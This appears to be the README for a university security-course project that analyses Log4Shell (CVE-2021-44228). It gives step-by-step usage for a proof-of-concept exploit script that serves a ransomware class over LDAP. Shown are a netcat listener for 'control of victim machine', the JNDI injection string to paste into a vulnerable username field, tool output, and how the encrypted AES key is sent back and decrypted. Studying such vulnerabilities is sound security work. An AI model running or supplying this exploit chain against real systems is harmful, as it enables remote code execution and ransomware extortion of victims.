# log4shell-analysis
Project for Foundations of Security course, University of Verona 


Proof-of-concept (POC)
----------------------
In this POC you will find some scripts that automate some of the processes that lead to the results.
We suggest you to follow the steps below to set everything up.

### Requirements:
```bash
pip install -r requirements.txt
```

### Usage:
Start a netcat listener to gain information or control of victim machine: <br>
```bash
$ nc -lvnp 9001
```
#### Ransomware.java:
You will find a Ransomware POC that can be used to encrypt victim's data. To make everything work you shall follow these steps: <br>
1. Generate RSA key pair, default output folder is *./RSA_KEYS*:
```py
$ python3 rsa-keygen.py
```
2. Run the exploit script, which will start up a LDAP server that will serve the chosen malware:
```py
$ python3 exploit.py ./attacker/exploit/Ransomware.java --ip localhost --port 8000 --ncport 9001

[!] CVE: CVE-2021-44228
[!] Log4j vulnerability POC tool
Loading malicious code file attacker/exploit/Ransomware.java

[+] Ransomware.java class created success
[+] Setting up LDAP server
                                                    
[+] Send me: ${jndi:ldap://localhost:1389/a}

[+] Starting Webserver on port 8000 http://0.0.0.0:8000
Listening on 0.0.0.0:1389
```
3. Then you shall past the "Send me" value in the username field of the vulnerable web application
4. You will receive on your netcat listener the AES key encrypted with your generated RSA public key
5. Use the decrypt script to get a base64 encoded and decrypted AES key:
```py
$ python3 decrypt.py MxZYTyiIW9C1ROhMcRRdZZFHtAEuQzRaVfm+jGWTXs974ynhES...
```

